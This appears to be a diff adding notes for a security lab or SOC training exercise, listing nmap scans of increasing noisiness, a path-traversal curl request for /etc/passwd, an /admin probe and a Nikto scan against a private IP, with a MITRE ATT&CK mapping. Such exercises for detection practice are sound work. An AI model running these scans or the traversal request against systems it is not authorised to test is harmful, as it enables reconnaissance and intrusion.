@@ -1,0 +1,24 @@
+Step A1 — Basic TCP scan
+nmap -sS -p 80 10.79.184.60
+
+Step A2 — Service & version scan (louder)
+nmap -sV -p 80 10.79.184.60
+
+Step A3 — Aggressive scan (SOC-level noise)
+nmap -A -p 80 10.79.184.60
+
+“This simulates reconnaissance activity where an attacker enumerates exposed services before exploitation. In MITRE ATT&CK this maps to T1046 – Network Service Scanning.”
+
+ATTACK PHASE 2 — WEB ENUMERATION (OWASP + IDS)
+
+Step A3 — Path traversal & discovery
+curl http://10.79.184.60/../../../../etc/passwd
+
+curl http://10.79.184.60/admin
+
+Step A6 — Nikto scan (OWASP Top 10 style)
+
+If Nikto is installed:
+
+nikto -h http://10.79.184.60
+
